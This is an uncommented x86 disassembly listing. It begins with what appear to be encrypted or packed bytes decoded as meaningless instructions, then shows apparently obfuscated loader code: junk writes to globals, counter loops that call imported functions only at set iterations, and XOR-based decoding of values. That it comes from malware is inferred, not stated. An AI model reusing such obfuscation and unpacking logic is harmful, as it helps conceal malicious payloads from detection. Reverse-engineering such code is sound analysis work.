  408cd3:	sub    bl,ah
  408cd5:	xlat   BYTE PTR ds:[ebx]
  408cd6:	cdq    
  408cd7:	jno    0x408d3c
  408cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cda:	xor    BYTE PTR [edx+ebx*2+0x50f1f760],ch
  408ce1:	and    ah,BYTE PTR [ecx+0xb]
  408ce4:	or     eax,0x5e339121
  408ce9:	adc    ah,cl
  408ceb:	(bad)  
  408cec:	imul   ebp,DWORD PTR [eax-0x3bf8f4a9],0xbef954a0
  408cf6:	in     eax,0xc1
  408cf8:	ficom  WORD PTR [edi]
  408cfa:	cmp    al,0xd4
  408cfc:	add    edi,DWORD PTR [ecx]
  408cfe:	ins    BYTE PTR es:[edi],dx
  408cff:	cmp    DWORD PTR [edx+0x12],eax
  408d02:	clc    
  408d03:	xor    al,0xa7
  408d05:	(bad)  
  408d06:	push   ecx
  408d07:	popa   
  408d08:	int    0x93
  408d0a:	popf   
  408d0b:	fs call 0x7fdf:0x80338e1a
  408d13:	mov    ch,0x9
  408d15:	cs sub eax,0x87913905
  408d1b:	sbb    cl,dh
  408d1d:	retf   0xbbfa
  408d20:	cs call 0x9eef:0xc14945e8
  408d28:	mov    ds:0xdcd9b5d7,al
  408d2d:	add    DWORD PTR [ebx-0x70],0x25aa40cb
  408d34:	loopne 0x408d83
  408d36:	or     BYTE PTR [esi+edx*4-0x61],0x39
  408d3b:	pinsrw mm7,esi,0x7c
  408d3f:	sub    al,0x56
  408d41:	push   edx
  408d43:	repnz cld 
  408d45:	test   DWORD PTR [ebp-0x29],0x15ab5130
  408d4c:	jo     0x408d24
  408d4e:	les    edx,FWORD PTR [ecx+0x16]
  408d51:	xor    bh,BYTE PTR [ecx+ecx*8-0x3f]
  408d55:	sbb    ecx,esp
  408d57:	xchg   esp,eax
  408d58:	push   0x5f
  408d5a:	pop    es
  408d5b:	stos   BYTE PTR es:[edi],al
  408d5c:	or     al,0x6e
  408d5e:	jecxz  0x408d15
  408d60:	rcl    BYTE PTR [edi-0x4f272622],cl
  408d66:	jae    0x408d41
  408d68:	xor    al,0xc1
  408d6a:	mov    ebp,0x1ba8e7b2
  408d6f:	add    BYTE PTR [esi+0x50],al
  408d72:	sub    eax,0xb2dbedb4
  408d77:	fiadd  WORD PTR [ebx]
  408d79:	xlat   BYTE PTR ds:[ebx]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	lods   eax,DWORD PTR ds:[esi]
  408dab:	push   ss
  408dac:	and    ebp,DWORD PTR [edi-0x4f]
  408daf:	sar    DWORD PTR [esi+0x7e],1
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408e36
  408db7:	push   edx
  408db8:	jle    0x408d49
  408dba:	jmp    0x408dab
  408dbc:	mov    eax,ds:0x5e7e5210
  408dc1:	mov    ds:0x9acb4603,al
  408dc6:	and    ch,BYTE PTR [edi-0x7fc72389]
  408dcc:	aaa    
  408dcd:	fcom   DWORD PTR [ebx-0x28]
  408dd0:	(bad)  
  408dd2:	sbb    al,0x86
  408dd4:	jmp    0x408d5b
  408dd6:	iret   
  408dd7:	adc    DWORD PTR [eax+0x2c],ecx
  408dda:	mov    ds:0xa17fdd0c,eax
  408ddf:	(bad)  
  408de0:	test   al,0x2e
  408de2:	xor    eax,0x6a3129f8
  408de7:	lods   eax,DWORD PTR ds:[esi]
  408de8:	lods   eax,DWORD PTR ds:[esi]
  408de9:	jmp    0x408e66
  408deb:	fwait
  408dec:	retf   0x9374
  408def:	xchg   ebp,eax
  408df0:	les    esi,FWORD PTR [ecx]
  408df2:	scas   al,BYTE PTR es:[edi]
  408df3:	inc    edi
  408df4:	inc    ebp
  408df5:	lods   eax,DWORD PTR ds:[esi]
  408df6:	mov    DWORD PTR [ecx-0x592fccea],ebx
  408dfc:	and    eax,0xc0f73c9c
  408e01:	out    0xbe,al
  408e03:	push   edx
  408e04:	jle    0x408e2c
  408e06:	repz xchg edi,eax
  408e08:	xor    BYTE PTR [ebp+esi*4+0x5b930d8c],al
  408e0f:	ja     0x408e2e
  408e11:	jmp    0x408dae
  408e13:	loopne 0x408e34
  408e15:	(bad)  
  408e16:	pusha  
  408e17:	dec    esi
  408e18:	dec    ecx
  408e19:	adc    al,0xd
  408e1b:	aam    0xa7
  408e1d:	xor    BYTE PTR [ecx],ch
  408e1f:	popf   
  408e20:	dec    esi
  408e21:	ficomp DWORD PTR [eax+0x1a387a69]
  408e27:	jbe    0x408e1e
  408e29:	pop    edx
  408e2a:	xchg   ebx,eax
  408e2b:	jmp    0x339bd736
  408e30:	sub    esp,DWORD PTR [edi]
  408e32:	or     DWORD PTR [edi-0x4c9b765d],edi
  408e38:	mov    esp,0x2769e877
  408e3d:	adc    bl,BYTE PTR [ecx+ecx*1+0x7b1d6311]
  408e44:	outs   dx,BYTE PTR ds:[esi]
  408e45:	sub    BYTE PTR [eax-0x3c],0xc8
  408e49:	jecxz  0x408ded
  408e4b:	imul   esp,DWORD PTR [edi+0x7363cda6],0xffffffb8
  408e52:	test   BYTE PTR [eax-0x6a6d5f1d],ch
  408e58:	push   eax
  408e59:	pop    ecx
  408e5a:	ja     0x408e94
  408e5c:	xor    al,0xe2
  408e5e:	ret    
  408e5f:	cmp    ah,ah
  408e61:	mov    bh,0x62
  408e63:	push   0x6f007f95
  408e68:	inc    esp
  408e69:	xchg   BYTE PTR [eax],al
  408e6b:	lahf   
  408e6c:	daa    
  408e6d:	jno    0x408eac
  408e6f:	rcl    BYTE PTR [edx+ebx*2-0xf],cl
  408e73:	inc    edi
  408e74:	adc    DWORD PTR [esi+edi*2],esp
  408e77:	dec    ebp
  408e78:	push   edx
  408e79:	mov    ch,0x20
  408e7b:	(bad)  
  408e7c:	pop    ebp
  408e7d:	cwde   
  408e7e:	push   esp
  408e7f:	jne    0x408e5f
  408e81:	cmp    cl,bh
  408e83:	fisub  DWORD PTR [edx]
  408e85:	loope  0x408e2e
  408e87:	sub    DWORD PTR [ebx],edi
  408e89:	sbb    DWORD PTR [ebp+0x6c],edi
  408e8c:	(bad)  
  408e8d:	ja     0x408e82
  408e8f:	fwait
  408e90:	rcr    DWORD PTR [ebp+0x1f9f0350],1
  408e96:	jno    0x408e88
  408e98:	sbb    eax,0x5904b7fb
  408e9d:	xchg   edx,eax
  408e9e:	rol    BYTE PTR [edx-0x3],1
  408ea1:	adc    eax,0xcd9afef1
  408ea6:	les    eax,FWORD PTR [edi]
  408ea8:	std    
  408ea9:	hlt    
  408eaa:	pushf  
  408eab:	mov    dl,bl
  408ead:	shl    DWORD PTR [ecx+edi*1+0x2],0x15
  408eb2:	ins    DWORD PTR es:[edi],dx
  408eb3:	(bad)  
  408eb4:	(bad)  
  408eb5:	je     0x408e91
  408eb7:	and    DWORD PTR [ebp-0x4e],esp
  408eba:	jl     0x408e6c
  408ebc:	call   0xd84b7232
  408ec1:	pop    edx
  408ec2:	sub    DWORD PTR [esi+0x5b],ebx
  408ec5:	fimul  WORD PTR [ebp-0x78b1c7f]
  408ecb:	push   esi
  408ecc:	cmp    edx,DWORD PTR [esi+0x300d6f3c]
  408ed2:	jmp    0x91a:0x6142d711
  408ed9:	push   ds
  408eda:	add    edi,0x6a
  408edd:	in     eax,dx
  408ede:	ret    0xe982
  408ee1:	jae    0x408e6c
  408ee3:	imul   edi,ecx,0x77
  408ee6:	xchg   cl,dl
  408ee8:	or     al,0x15
  408eea:	jg     0x408ecc
  408eec:	inc    DWORD PTR cs:[edx-0x3f]
  408ef0:	mov    eax,0xb148797d
  408ef5:	repnz push edi
  408ef7:	loopne 0x408f72
  408ef9:	stos   BYTE PTR es:[edi],al
  408efa:	test   DWORD PTR [esp+eax*1],esp
  408efd:	push   edi
  408efe:	mov    ebp,0xb3bc5206
  408f03:	inc    esp
  408f04:	mov    esp,0xa0bef014
  408f09:	pusha  
  408f0a:	out    dx,eax
  408f0b:	jmp    0xf88d:0x82e91a89
  408f12:	loopne 0x408f28
  408f14:	mov    ah,0x25
  408f16:	jg     0x408ed4
  408f18:	jg     0x408ef2
  408f1a:	mov    dl,ah
  408f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f1d:	fidiv  WORD PTR [ebx+0x1229d38a]
  408f23:	(bad)  
  408f24:	cdq    
  408f25:	lods   eax,DWORD PTR ds:[esi]
  408f26:	adc    al,0xc3
  408f28:	pop    esp
  408f29:	popf   
  408f2a:	push   edi
  408f2b:	rcl    DWORD PTR [ecx+0x375b3ab1],cl
  408f31:	jns    0x408f04
  408f33:	mov    ebp,0x7e1a8317
  408f38:	aam    0x32
  408f3a:	mov    bh,0xe2
  408f3c:	ins    BYTE PTR es:[edi],dx
  408f3d:	popf   
  408f3e:	xchg   ah,cl
  408f40:	pop    ecx
  408f41:	xor    DWORD PTR [ebp+0x7b],ecx
  408f44:	adc    bl,0x23
  408f47:	xchg   esp,eax
  408f48:	ds loope 0x408ed6
  408f4b:	pop    ebp
  408f4c:	clc    
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	test   DWORD PTR [ecx-0x1],edx
  408f63:	xchg   esi,eax
  408f64:	int    0xdf
  408f66:	jle    0x408fe6
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408eef
  408f6d:	xchg   esi,eax
  408f6e:	sbb    bl,BYTE PTR [eax+0x48]
  408f71:	jb     0x408f47
  408f73:	cdq    
  408f74:	mov    ecx,0x1a5f8ed5
  408f79:	xchg   esp,eax
  408f7a:	push   0x19
  408f7c:	pushf  
  408f7d:	or     dh,BYTE PTR [ecx-0x638fa581]
  408f83:	gs or  al,0xc
  408f86:	inc    edi
  408f87:	push   ebx
  408f88:	sahf   
  408f89:	cmp    dh,BYTE PTR [ebx]
  408f8b:	imul   esi,edi,0xffffffdf
  408f8e:	(bad)  
  408f8f:	aam    0x3f
  408f91:	xchg   ebp,eax
  408f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f93:	add    eax,0xc92b57df
  408f98:	fwait
  408f99:	je     0x408fd1
  408f9b:	lock lods al,BYTE PTR ds:[esi]
  408f9d:	xor    al,0x50
  408f9f:	and    dh,BYTE PTR [ebx]
  408fa1:	(bad)  [ebx+0x461c95d4]
  408fa7:	icebp  
  408fa8:	xchg   edi,eax
  408fa9:	mov    cl,0x42
  408fab:	into   
  408fac:	imul   ebx,esp,0xffffffda
  408faf:	retf   
  408fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fb1:	clc    
  408fb2:	ins    BYTE PTR es:[edi],dx
  408fb3:	mov    ?,edi
  408fb5:	fidiv  DWORD PTR [eax-0x28]
  408fb8:	xchg   esp,eax
  408fb9:	xchg   ebx,eax
  408fba:	xlat   BYTE PTR ds:[ebx]
  408fbb:	sbb    BYTE PTR [ecx-0x62981210],dl
  408fc1:	push   esp
  408fc2:	pop    ebp
  408fc3:	push   ds
  408fc4:	inc    esp
  408fc5:	or     edx,DWORD PTR [eax+0x1668428d]
  408fcb:	jge    0x408f66
  408fcd:	retf   
  408fce:	lahf   
  408fcf:	mov    DWORD PTR ds:0x35575a26,esi
  408fd5:	push   ss
  408fd6:	sbb    edx,DWORD PTR [eax+0x28747d84]
  408fdc:	pushf  
  408fdd:	add    edx,DWORD PTR [ecx-0x30]
  408fe0:	fwait
  408fe1:	in     eax,dx
  408fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fe3:	xor    DWORD PTR [eax],esp
  408fe5:	(bad)  
  408fe7:	push   ebx
  408fe8:	pop    ebp
  408fe9:	jg     0x408fd3
  408feb:	add    esi,edx
  408fed:	(bad)  
  408fee:	mov    bl,0x11
  408ff0:	dec    BYTE PTR [ecx]
  408ff2:	jo     0x408fd4
  408ff4:	outs   dx,BYTE PTR ds:[esi]
  408ff5:	sbb    eax,0x65e8a571
  408ffa:	cld    
  408ffb:	push   ecx
  408ffc:	or     dl,bh
  408ffe:	cld    
  408fff:	pop    edi
  409000:	jmp    0x409066
  409002:	mov    ds:0xa26a5fa3,al
  409007:	xor    eax,0x458c0350
  40900c:	inc    edx
  40900d:	push   es
  40900e:	mov    dl,0x77
  409010:	and    ebp,ebx
  409012:	jecxz  0x40901d
  409014:	shr    BYTE PTR [ebp+0x76559073],0xf3
  40901b:	das    
  40901c:	in     eax,dx
  40901d:	jle    0x408ff8
  40901f:	repz data16 jns 0x409020
  409023:	xchg   BYTE PTR [ebx-0x8],bl
  409026:	and    eax,0xd74398cd
  40902b:	adc    BYTE PTR [eax],dl
  40902d:	jmp    DWORD PTR [eax-0x6ed1a466]
  409033:	(bad)  
  409034:	jmp    0x4eed:0xba2eab64
  40903b:	call   0xdd0:0x4c689858
  409042:	fsubr  st(0),st
  409044:	outs   dx,DWORD PTR ds:[esi]
  409045:	pop    esp
  409046:	cmp    DWORD PTR [edi+0x22318b96],eax
  40904c:	in     al,0x21
  40904e:	xor    ebx,ebp
  409050:	jp     0x40908e
  409052:	dec    eax
  409053:	pop    ecx
  409054:	icebp  
  409055:	fsub   DWORD PTR [edi]
  409057:	push   0xa8f11322
  40905c:	fisub  WORD PTR [ecx]
  40905e:	mov    ch,0x47
  409060:	xlat   BYTE PTR ds:[ebx]
  409061:	outs   dx,BYTE PTR ds:[esi]
  409062:	mov    bh,0x9
  409064:	int    0x1c
  409066:	push   ecx
  409067:	nop
  409068:	xor    al,0xfe
  40906a:	jnp    0x409079
  40906c:	test   eax,0xa29df316
  409071:	js     0x409069
  409073:	inc    esp
  409074:	retf   
  409075:	mov    BYTE PTR [edx-0x5f5d115b],cl
  40907b:	test   eax,0xe5036574
  409080:	pop    ebp
  409081:	mov    esi,0x3d24ef0e
  409086:	xchg   esi,eax
  409087:	sbb    eax,0x2f3376f5
  40908c:	ds mov cl,0xcf
  40908f:	add    BYTE PTR [edi],dl
  409091:	add    cl,bh
  409093:	arpl   WORD PTR [ebp-0x58],bx
  409096:	pusha  
  409097:	push   cs
  409098:	adc    al,0x95
  40909b:	xlat   BYTE PTR ds:[ebx]
  40909c:	fnstcw WORD PTR [ebx-0x43211bcc]
  4090a2:	hlt    
  4090a3:	lock xchg ecx,eax
  4090a5:	hlt    
  4090a6:	add    DWORD PTR [esi-0x1266f0e0],esp
  4090ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090ad:	sub    cl,BYTE PTR [eax*4+0x50d76ce5]
  4090b4:	jmp    0xe43a8d0d
  4090b9:	pop    edi
  4090ba:	test   ch,ch
  4090bc:	mov    dh,0xa4
  4090be:	pop    es
  4090bf:	test   al,0xb3
  4090c1:	sahf   
  4090c2:	shr    BYTE PTR [ebp+0x79],cl
  4090c5:	jne    0x409093
  4090c7:	mov    al,ds:0xcf0e9845
  4090cc:	inc    DWORD PTR [esi]
  4090ce:	fisub  WORD PTR [esi+0x5]
  4090d1:	jmp    0x4090e5
  4090d3:	or     ebx,DWORD PTR [eax+0x219099a6]
  4090d9:	loop   0x40905f
  4090db:	je     0x4090f5
  4090dd:	ficom  DWORD PTR [edx+0x173baceb]
  4090e3:	ror    DWORD PTR [eax+0xbb98f56],0xb9
  4090ea:	xor    DWORD PTR [esp+ebp*8+0x43bc0652],edi
  4090f1:	add    BYTE PTR [eax+eiz*4+0x6d],dh
  4090f5:	(bad)  
  4090f6:	and    dh,BYTE PTR [esi]
  4090f8:	icebp  
  4090f9:	xor    DWORD PTR ds:0xa766309d,0x6a
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42ea37
  40911f:	and    DWORD PTR ds:0x4304db,0x43043d
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42eddb,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x4304e3,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e7d8,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42ea77
  40916b:	sbb    DWORD PTR ds:0x430441,0x430471
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42edcb,0x624a
  409184:	call   DWORD PTR ds:0x42ea3f
  40918a:	adc    DWORD PTR ds:0x42e7c0,0x43045d
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x430451,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x430435,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x43046d,0x42e7d4
  4091c4:	call   DWORD PTR ds:0x42eae3
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e7c8
  4091d6:	and    DWORD PTR ds:0x430459,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x430439,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42eddb,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42eddb,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42eddb,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e9e3
  409219:	mov    ecx,DWORD PTR ds:0x42eddb
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42eddb,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ede3,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42eddf
  409243:	sbb    eax,DWORD PTR ds:0x42eddb
  409249:	mov    ds:0x42eddf,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42eddb
  409261:	and    DWORD PTR ds:0x42e7bc,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x430455,0x4304d7
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e7cc,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x430455,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42edcb,0x4304e7
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42edcb,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x430449,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x430459,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ede3,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e7c8,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x430435,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e9ff
  40930f:	adc    DWORD PTR ds:0x42eddf,0x42e7cc
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x430455,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x430451,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x430451
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x430451,ecx
  409352:	cmp    DWORD PTR ds:0x430451,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x430451,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e9e7
  409375:	cmp    DWORD PTR ds:0x430451,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x430451
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x430451,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42edcb
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e967
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x4304d3,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x4304eb,0x17
  4093b9:	cmp    DWORD PTR ds:0x4304eb,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x4304eb,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e9eb
  4093df:	cmp    DWORD PTR ds:0x4304eb,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x4304eb
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x4304eb,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x4304eb
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x4304eb,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x4304df,0x10
  409415:	cmp    DWORD PTR ds:0x4304df,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x4304df,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e9ef
  409438:	mov    ecx,DWORD PTR ds:0x4304df
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x4304df,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x430461
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x430469,0x16
  409461:	cmp    DWORD PTR ds:0x430469,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x430469,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e9f3
  409481:	mov    ecx,DWORD PTR ds:0x430469
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x430469,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42edcf,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42edcf
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42edcf,ecx
  4094b7:	cmp    DWORD PTR ds:0x42edcf,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42edcf,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e8fb
  4094d6:	push   0x42e8a5
  4094db:	call   DWORD PTR ds:0x42ec2b
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x430451,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x4304eb,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ede3,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x430469,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x4304e3,0x430471
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x430439,0x1e
  40953f:	cmp    DWORD PTR ds:0x430439,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x430439,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e7dc
  409566:	call   DWORD PTR ds:0x42e9f7
  40956c:	mov    eax,ds:0x430439
  409571:	dec    eax
  409572:	mov    ds:0x430439,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430489
  409582:	mov    eax,ds:0x430513
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x4304cf,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e7d8,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x430441,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x430441
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x430441,edx
  4095e8:	cmp    DWORD PTR ds:0x430441,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e8cd
  409617:	call   DWORD PTR ds:0x42e9fb
  40961d:	cmp    DWORD PTR ds:0x430441,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e7c8,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e7c8
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e7c8,ecx
  40964a:	cmp    DWORD PTR ds:0x42e7c8,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42ec2f
  409672:	cmp    DWORD PTR ds:0x42e7c8,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
